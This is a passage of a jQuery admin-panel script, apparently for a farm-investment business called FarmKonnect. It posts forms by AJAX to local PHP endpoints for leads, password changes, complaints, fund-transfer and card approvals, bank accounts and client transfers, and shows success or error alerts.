		setTimeout( function(){ window.location.href = "user_to_role";},7000);
	 }	

	 else if(data == "empty_fields"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found"
		});
	 }


	 else if(data == "record_exists"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Record already exists"
		});
	 }


	 else if(data == "password_mismatch"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Passwords Don't Match"
		});
	 }


	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in adding user"
		});
	 }
	 $('#add_user_to_role').text("Add User");
		$('#add_user_to_role').attr("disabled", false);
	 //alert(data);
		
  }
  });
 e.preventDefault();
});



///05-03-2020
$('#add_lead').click(function(e){
			e.preventDefault();
			$.ajax({
			url:"ajax_admin/add_leads.php",
			method:"POST",
			data:$('#add_leads_form').serialize(),
			success:function(data){
			 if(data == 200){
			 $.alert({
			 title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			 closeAnimation: 'left',content: "Lead has been added successfully"
			 });
			 setTimeout( function(){ window.location.href = "add_leads";}, 4000);
			 }	

 			else if(data == 300){

			 $.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found"
			 });
			 }
			else if(data == 400){

			 $.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Lead already exists, please update instead"
			 });
			 }

			 else{

			 $.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in adding lead"
			 });
			 }
			//alert(data);

			}
			});
		
	});




$('.get_leads_id_be').click(function(e){
e.preventDefault();
let id = $(this).attr('id');

//alert(realdesc);
$.ajax({
  url:"ajax_admin/edit_leads.php",
  method:"POST",
  data:$('#edit_leads_form'+id).serialize(),
  success:function(data){
  	// alert(data);
	 if(parseInt(data) == 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Lead's details updated successfully"
		});
		setTimeout( function(){ window.location.href = "lead_pool";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error updating Lead's details"
		});
	 }
		
  }
  });
e.preventDefault();

});


$('.get_leads_id_MM').click(function(e){
e.preventDefault();
let id = $(this).attr('id');

//alert(realdesc);
$.ajax({
  url:"ajax_admin/edit_leads.php",
  method:"POST",
  data:$('#edit_leads_form'+id).serialize(),
  success:function(data){
  	// alert(data);
	 if(parseInt(data) == 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Lead's details updated successfully"
		});
		setTimeout( function(){ window.location.href = "lead_pool_MM";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error updating Lead's details"
		});
	 }
		
  }
  });
e.preventDefault();

});


$('.get_leads_id').click(function(e){
e.preventDefault();
let id = $(this).attr('id');

//alert(realdesc);
$.ajax({
  url:"ajax_admin/edit_leads.php",
  method:"POST",
  data:$('#edit_leads_form'+id).serialize(),
  success:function(data){
  	// alert(data);
	 if(parseInt(data) == 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Lead's details updated successfully"
		});
		setTimeout( function(){ window.location.href = "view_leads";}, 1000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error updating Lead's details"
		});
	 }
		
  }
  });
e.preventDefault();

});




$('.archive_lead').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/archive_lead.php",
  method:"POST",
  data:$('#archive_lead_form'+id).serialize(),
  success:function(data){
  	// alert(data);
	 if(parseInt(data) == 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Lead archived successfully"
		});
		setTimeout( function(){ window.location.href = "view_leads";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in archiving Lead"
		});
	 }
		
  }
  });
});

$('.unarchive_lead').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/unarchive_lead.php",
  method:"POST",
  data:$('#unarchive_lead_form'+id).serialize(),
  success:function(data){
  	// alert(data);
	 if(parseInt(data) == 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Lead unarchived successfully"
		});
		setTimeout( function(){ window.location.href = "view_leads";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in unarchiving Lead"
		});
	 }
		
  }
  });
});



//12-03-2020
$('#change_password').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/change_password.php",
  method:"POST",
  data:$('#change_password_form').serialize(),
  success:function(data){
  	// alert(data);
	 if(parseInt(data) == 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Password changed successfully"
		});
		setTimeout( function(){ window.location.href = "change_password";}, 4000);
	 }

	 else if(parseInt(data) == 300){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Passwords do not match"
		});
	 }

	 else if(parseInt(data) == 400){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found"
		});
	 }
	 
	 else if(parseInt(data) == 600){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Your old password is incorrect"
		});
	 }
	 
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in Changing Password"
		});
	 }
		
  }
  });
});




$('#change_password_user').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_scripts/change_password.php",
  method:"POST",
  data:$('#change_password_user_form').serialize(),
  success:function(data){
  	// alert(data);
	 if(parseInt(data) == 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Password changed successfully"
		});
		setTimeout( function(){ window.location.href = "home";}, 4000);
	 }

	 else if(parseInt(data) == 300){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Passwords do not match"
		});
	 }

	 else if(parseInt(data) == 400){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found"
		});
	 }
	 
	 else if(parseInt(data) == 600){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Your old password is incorrect"
		});
	 }
	 
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in Changing Password"
		});
	 }
		
  }
  });
});


$('#send_complaint').click(function(e){
e.preventDefault();
$.ajax({
  url:"ajax_scripts/send_complaint.php",
  method:"POST",
  data:$('#send_complaint_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Your complaint has been submitted, you will be contacted soon, Thanks"
		});
		setTimeout( function(){ window.location.href = "complaints";}, 1000);
	 }
	 else if(data == 400){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found"
		});
	 }	

	  else if(data == 300){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Record already exist, please contact FarmKonnect for follow up"
		});
	 }

	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error"
		});
	 }
		
  }
  });
});




$('#send_feedback').click(function(e){
e.preventDefault();
$.ajax({
  url:"ajax_scripts/send_feedback.php",
  method:"POST",
  data:$('#send_feedback_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Your feedback has been submitted, Thanks"
		});
		setTimeout( function(){ window.location.href = "feedback";}, 1000);
	 }
	 else if(data == 400){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found"
		});
	 }	

	  else if(data == 300){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Record already exist, please contact FarmKonnect for follow up"
		});
	 }

	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error"
		});
	 }
		
  }
  });
});



$('.get_complaint_id_be').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/edit_complaint.php",
  method:"POST",
  data:$('#edit_complaints'+id).serialize(),
  success:function(data){
	 if(data == 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Updated Complaint successfully"
		});
	 	setTimeout( function(){ window.location.href = "BE_request_complaint";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in updating complaint"
		});
	 }
		
  }
  });
});

$('.get_complaint_id').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/edit_complaint.php",
  method:"POST",
  data:$('#edit_complaints'+id).serialize(),
  success:function(data){
	 if(data == 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Updated Complaint successfully"
		});
	 	setTimeout( function(){ window.location.href = "view_complaints";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in updating complaint"
		});
	 }
		
  }
  });
});


$('.update_withdrawal_request').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/edit_withdrawal_request.php",
  method:"POST",
  data:$('#edit_withdrawal_request'+id).serialize(),
  success:function(data){
	 if(data == 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Request Status updated successfully"
		});
	 	setTimeout( function(){ window.location.href = "withdrawal_request";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in updating Request Status"
		});
	 }
		
  }
  });
});


//16-03-2020

$('.edit_transfer_request_status').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/edit_transfer_request.php",
  method:"POST",
  data:$('#edit_transfer_request_status'+id).serialize(),
  success:function(data){
	 if(data == 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Request Status updated successfully"
		});
	 	setTimeout( function(){ window.location.href = "pending_transfers";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in updating Request Status"
		});
	 }
		
  }
  });
});



$('.get_feedback_id_be').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/edit_feedback.php",
  method:"POST",
  data:$('#edit_feedbacks'+id).serialize(),
  success:function(data){
	 if(data == 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Updated Feedback successfully"
		});
	 	setTimeout( function(){ window.location.href = "BE_feedback";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in updating feedback"
		});
	 }
		
  }
  });
});

$('.get_feedback_id').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/edit_feedback.php",
  method:"POST",
  data:$('#edit_feedbacks'+id).serialize(),
  success:function(data){
	 if(data == 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Updated Feedback successfully"
		});
	 	setTimeout( function(){ window.location.href = "view_feedback";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in updating feedback"
		});
	 }
		
  }
  });
});

$('.approve_funds_transfer_request').click(function(e){
let id = $(this).attr('id');
// let name = "name"+id;
// let realname = $("#"+name).val();
// let desc = "description"+id;
// let realdesc = $("#"+desc).val();

//alert(realdesc);
$.ajax({
  url:"ajax_admin/approve_funds_transfer_request.php",
  method:"POST",
  data:$('#approve_fund_transfer_request_form'+id).serialize(),
  success:function(data){
  	// alert(data);
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Fund Transfer Request has been approved"
		});
	 	$('.approve_modal').modal("hide");
		$('#approve_funds_transfer_modal'+id).html("<small class='badge badge-success'>Approved</small>");
		//setTimeout( function(){ window.location.href = "funds_transfer_request";}, 1000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error approving request"
		});
	 }
		
  }
  });
});


$('.reject_funds_transfer_request').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
// let name = "name"+id;
// let realname = $("#"+name).val();
// let desc = "description"+id;
// let realdesc = $("#"+desc).val();

//alert(realdesc);
$.ajax({
  url:"ajax_admin/reject_funds_transfer_request.php",
  method:"POST",
  data:$('#reject_fund_transfer_request_form'+id).serialize(),
  success:function(data){
  	// alert(data);
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Funds Transfer Request rejected"
		});
	 	$('.reject_modal').modal("hide");
		$('#reject_funds_transfer_modal'+id).html("<small class='badge badge-danger'>Rejected</small>");
		//setTimeout( function(){ window.location.href = "funds_transfer_request";}, 1000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error rejecting request"
		});
	 }
		
  }
  });
});



//21-03-2020
$('.approve_card_request').click(function(e){
let id = $(this).attr('id');
// let name = "name"+id;
// let realname = $("#"+name).val();
// let desc = "description"+id;
// let realdesc = $("#"+desc).val();

//alert(realdesc);
$.ajax({
  url:"ajax_admin/approve_card_request.php",
  method:"POST",
  data:$('#approve_card_request_form'+id).serialize(),
  success:function(data){
  	// alert(data);
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Access Card request approved successfully"
		});
	 	$('.approve_modal').modal("hide");
		$('#approve_card_modal'+id).html("<small class='badge badge-success'>Approved</small>");
		//setTimeout( function(){ window.location.href = "access_card_request";}, 1000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error approving request"
		});
	 }
		
  }
  });
});


$('.reject_card_request').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
// let name = "name"+id;
// let realname = $("#"+name).val();
// let desc = "description"+id;
// let realdesc = $("#"+desc).val();

//alert(realdesc);
$.ajax({
  url:"ajax_admin/reject_card_request.php",
  method:"POST",
  data:$('#reject_card_request_form'+id).serialize(),
  success:function(data){
  	// alert(data);
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Access Card request has been rejected"
		});
	 	$('.reject_modal').modal("hide");
		$('#reject_card_modal'+id).html("<small class='badge badge-danger'>Rejected</small>");
		//setTimeout( function(){ window.location.href = "access_card_request";}, 1000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error rejecting request"
		});
	 }
		
  }
  });
});


$('.verify_user').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
// let name = "name"+id;
// let realname = $("#"+name).val();
// let desc = "description"+id;
// let realdesc = $("#"+desc).val();

//alert(realdesc);
$.ajax({
  url:"ajax_admin/verify_user.php",
  method:"POST",
  data:$('#verify_user_form'+id).serialize(),
  beforeSend: function(){
     $('.verify_user').attr("disabled", true);
     $('.verify_user').text("Verifying...");
  },
  success:function(data){
  	// alert(data);
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "User has been verified successfully"
		});
		$('.verify_modal').modal("hide");
        //$('#verify_user_modal').attr('disabled', true);
        //$('#verify_user_modal').css("display", "none");
        //$('#verified_id').css("display", "block");
		$('#verify_user_modal'+id).html("<small class='badge badge-success'>Verified</small>");
		//setTimeout( function(){ window.location.href = "verify_users";}, 5000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error verifying user"
		});
	 }
	 $('.verify_user').attr("disabled", false);
     $('.verify_user').text("Verify");
		
  }
  });
});



//27-02-2020
$('#add_terms_conditions').click(function(e){
e.preventDefault();
for ( instance in CKEDITOR.instances )
       CKEDITOR.instances[instance].updateElement();
$.ajax({
  url:"ajax_admin/add_terms_conditions.php",
  method:"POST",
  data: $('#add_terms_conditions_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Term and Condition have been added successfully"
		});
		setTimeout( function(){ window.location.href = "terms_conditions";}, 1000);
	 }
	 else if(data == 'empty_fields'){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found"
		});
	 }	

	  else if(data == 'record_exists'){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Record already exist"
		});
	 }

	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error"
		});
	 }
		
  }
  });
});


$('#update_terms_conditions').click(function(e){
e.preventDefault();
for ( instance in CKEDITOR.instances )
       CKEDITOR.instances[instance].updateElement();
$.ajax({
  url:"ajax_admin/update_terms_conditions.php",
  method:"POST",
  data: $('#update_terms_conditions_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Term and Condition have been updated successfully"
		});
		setTimeout( function(){ window.location.href = "update_terms_condition";}, 4000);
	 }
	 else if(data == 'empty_fields'){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found"
		});
	 }	

	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error"
		});
	 }
		
  }
  });
});



$('#add_bank_account').click(function(e){
e.preventDefault();
$.ajax({
  url:"ajax_admin/add_bank_account.php",
  method:"POST",
  data: $('#add_bank_account_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Bank Account has been added successfully"
		});
		setTimeout( function(){ window.location.href = "bank_accounts";}, 1000);
	 }
	 else if(data == 'empty_fields'){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found"
		});
	 }	

	  else if(data == 'record_exists'){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Record already exist, Please update instead"
		});
	 }

	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error"
		});
	 }
		
  }
  });
});



$('.edit_bank_account').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/edit_bank_account.php",
  method:"POST",
  data: $('#edit_bank_account_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Bank Account has been edited successfully"
		});
		setTimeout( function(){ window.location.href = "bank_accounts";}, 1000);
	 }
	 else if(data == 'empty_fields'){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found"
		});
	 }	

	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error"
		});
	 }
		
  }
  });
});


$('.delete_bank_account').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/delete_bank_account.php",
  method:"POST",
  data: $('#delete_bank_account_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Bank Account has been deleted successfully"
		});
		setTimeout( function(){ window.location.href = "bank_accounts";}, 3000);
	 }
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error"
		});
	 }
		
  }
  });
});



//31-03-2020
$('#register_sales').click(function(e){
e.preventDefault();
$.ajax({
  url:"ajax_admin/register_sales.php",
  method:"POST",
  data: $('#register_sales_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Sale has been registered successfully"
		});
		setTimeout( function(){ window.location.href = "register_sales";}, 1000);
	 }
	 else if(data == 'empty_fields'){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found"
		});
	 }

	 // else if(data == 'record_exists'){
	 // 	$.alert({
		// 	title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
		// 	closeAnimation: 'left',content: "Record Already Exists"
		// });
	 // }	

	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error"
		});
	 }
		
  }
  });
});


$('.claim_bonus').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/claim_bonus.php",
  method:"POST",
  data:$('#claim_bonus_form'+id).serialize(),
  success:function(data){
  	// alert(data);
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Your request to claim your bonus has been sent, you will be notified when it is processed"
		});
		setTimeout( function(){ window.location.href = "my_bonus";}, 1000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error claiming bonus"
		});
	 }
		
  }
  });
});


$('.claim_commission').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/claim_commission.php",
  method:"POST",
  data:$('#claim_commission_form'+id).serialize(),
  success:function(data){
  	// alert(data);
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Your request to claim your commission has been sent, you will be notified when it is processed"
		});
		setTimeout( function(){ window.location.href = "my_commission";}, 1000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error claiming commission"
		});
	 }
		
  }
  });
});



//02-04-2020
	//admin profile
	$('#update_admin_profile').click(function(e){
			e.preventDefault();
			$.ajax({
			url:"ajax_admin/update_admin_profile.php",
			method:"POST",
			data:$('#update_admin_profile_form').serialize(),
			success:function(data){
			 if(data == 200){
			 $.alert({
			 title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			 closeAnimation: 'left',content: "Your Profile has been updated Successfully"
			 });
			 setTimeout( function(){ window.location.href = "my_profile";}, 4000);
			 }	

			 else{

			 $.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in Updating"
			 });
			 }
			//alert(data);

			}
			});
		
	});

	$('.transfer_client').click(function(e){
			e.preventDefault();
			$.ajax({
			url:"ajax_admin/transfer_client.php",
			method:"POST",
			data:$('#transfer_client_form').serialize(),
			success:function(data){
			 if(data == "success"){
			 $.alert({
			 title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			 closeAnimation: 'left',content: "You have successfully transfered your client (s) temporarily"
			 });
			 setTimeout( function(){ window.location.href = "temporary_transfer_client";}, 4000);
			 }	

			 else if(data == "empty_fields"){
			 $.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty Field (s) found"
			 });
			 }

			else{
			 $.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error!"
			 });
			 }
			//alert(data);

			}
			});
		
	});


	$('#permanent_transfer_client').click(function(e){
			e.preventDefault();
			$.ajax({
			url:"ajax_admin/permanent_transfer_client.php",
			method:"POST",
			data:$('#permanent_transfer_client_form').serialize(),
			success:function(data){
			 if(data == "success"){
			 $.alert({
			 title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			 closeAnimation: 'left',content: "You have successfully transfered your client (s) temporarily"
			 });
			 setTimeout( function(){ window.location.href = "permanent_transfer";}, 4000);
			 }	

			 else if(data == "empty_fields"){
			 $.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty Field (s) found"
			 });
			 }

			else{
			 $.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in transfering Client"
			 });
			 }
			//alert(data);

			}
			});
		
	});


	$('#share_document').click(function(e){
			e.preventDefault();
			$.ajax({
			url:"ajax_admin/share_document.php",
			method:"POST",
			data:$('#share_document_form').serialize(),
			success:function(data){
			 if(data == "success"){
			 $.alert({
			 title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			 closeAnimation: 'left',content: "You have successfully shared document with your client (s)"
			 });
			 setTimeout( function(){ window.location.href = "share_document";}, 4000);
			 }	

			 else if(data == "empty_field"){
			 $.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty Field (s) found"
			 });
			 }

			else{
			 $.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in sharing Document"
			 });
			 }
			//alert(data);

			}
			});
		
	});


$('.action_reminder').click(function(e){
	e.preventDefault();
	$.ajax({
  url:"ajax_admin/action_reminder.php",
  method:"POST",
  data: $('#set_reminder_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Your Reminder has been set successfully"
		});
		setTimeout( function(){ window.location.href = "action_reminder";}, 4000);
	 }
	 else if(data == 'empty_fields'){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found"
		});
	 }	

	  else if(data == 'record_exists'){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Record already exist"
		});
	 }

	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in setting reminder"
		});
	 }
		
  }
  });
});


